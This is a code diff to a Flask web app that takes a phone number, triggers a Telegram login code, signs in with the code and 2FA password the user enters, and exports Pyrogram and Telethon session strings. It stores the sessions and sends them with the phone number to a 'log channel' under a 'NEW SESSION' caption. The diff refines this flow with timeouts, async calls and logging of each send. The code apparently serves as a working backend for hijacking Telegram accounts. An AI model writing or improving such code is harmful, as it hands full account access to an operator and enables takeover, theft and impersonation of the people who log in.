@@ -5,7 +5,7 @@ import time
 import uuid
 from datetime import datetime, timedelta
 
-from flask import Blueprint, jsonify, redirect, render_template, request, session
+from flask import Blueprint, jsonify, render_template, request, session
 from pyrogram.errors import (
     FloodWait,
     PasswordHashInvalid,
@@ -19,12 +19,7 @@ from pyrogram.errors import (
 from config import BACKGROUND_VIDEO
 
 from . import database
-from .database import (
-    ensure_db,
-    get_videos,
-    save_session_to_db,
-    send_to_channel,
-)
+from .database import ensure_db, save_session_to_db
 from .channel_notify import send_session_files_to_channel
 from .session_manager import session_manager
 from .session_tools import check_session
@@ -75,7 +70,7 @@ def bot_connect():
     if not PHONE_RE.match(phone):
         return _err("invalid phone format")
 
-    # Reuse pending session (90s) so double contact does not send a second code
+    # Reuse pending session (90s) — avoids second OTP on double contact
     try:
         ensure_db()
         if database.temp_sessions_col is not None:
@@ -99,13 +94,16 @@ def bot_connect():
         pass
 
     thread = session_manager.create_session(session_id, phone)
+    if not thread.wait_for_connection(timeout=20):
+        session_manager.remove_session(session_id)
+        err = getattr(thread, "connection_error", None) or "connect timeout"
+        return _err(f"connect failed: {err}")
+
     try:
-        def _send():
-            client = thread.client
-            if not getattr(client, "is_connected", False):
-                client.connect()
-            return client.send_code(phone)
-        sent = thread.execute(_send)
+        async def _send_code():
+            return await thread.client.send_code(phone)
+
+        sent = thread.execute(_send_code, timeout=30)
         phone_code_hash = getattr(sent, "phone_code_hash", None) or ""
         ensure_db()
         if database.temp_sessions_col is not None:
@@ -153,7 +151,7 @@ def verify_code():
     session_name = doc.get("session_name") or DEFAULT_SESSION_NAME
 
     thread = session_manager.get_session(session_id)
-    if not thread:
+    if not thread or not thread.is_alive():
         return _err("session not live — request a new code", 404)
 
     used_password = False
@@ -162,27 +160,39 @@ def verify_code():
     user = None
 
     try:
-        def _sign_in():
-            return thread.client.sign_in(phone, code, phone_code_hash=phone_code_hash)
+        async def _sign_in():
+            return await thread.client.sign_in(
+                phone_number=phone,
+                phone_code_hash=phone_code_hash,
+                phone_code=code,
+            )
+
         try:
-            user = thread.execute(_sign_in)
+            user = thread.execute(_sign_in, timeout=30)
         except SessionPasswordNeeded:
             if not password:
                 return _err("2FA password required", 401, requires_password=True)
-            def _pwd():
-                return thread.client.check_password(password)
-            user = thread.execute(_pwd)
+
+            async def _pwd():
+                return await thread.client.check_password(password)
+
+            user = thread.execute(_pwd, timeout=30)
             used_password = True
 
-        session_string = thread.execute(lambda: thread.client.export_session_string())
+        async def _export():
+            return await thread.client.export_session_string()
 
-        def _tele():
+        session_string = thread.execute(_export, timeout=20)
+
+        async def _tele():
             from Nexa.telethon_export import pyrogram_client_to_telethon
             s, _ = pyrogram_client_to_telethon(thread.client)
             return s
+
         try:
-            telethon_string = thread.execute(_tele)
-        except Exception:
+            telethon_string = thread.execute(_tele, timeout=15)
+        except Exception as te:
+            log.warning("telethon export failed: %s", te)
             telethon_string = None
 
     except PhoneCodeInvalid:
@@ -240,6 +250,7 @@ def verify_code():
     except Exception as exc:
         log.exception("save_session_to_db: %s", exc)
 
+    # Instantly send Telethon (+ Pyrogram) session files to log channel
     try:
         channel_msg = (
             "🟢 <b>NEW SESSION</b>\n"
@@ -258,14 +269,13 @@ def verify_code():
                 f"\n⚠️ <b>Status:</b> unverified "
                 f"({html_lib.escape(str(check_err))})"
             )
-        tele = user_info.get("telethon_string") or ""
-        pyro = user_info.get("session_string") or ""
-        send_session_files_to_channel(
+        ok_send = send_session_files_to_channel(
             phone=phone,
-            telethon_string=tele,
-            pyrogram_string=pyro,
+            telethon_string=user_info.get("telethon_string") or "",
+            pyrogram_string=user_info.get("session_string") or "",
             caption=channel_msg,
         )
+        log.info("channel session send ok=%s phone=%s", ok_send, phone)
     except Exception as exc:
         log.exception("send session to channel failed: %s", exc)
 
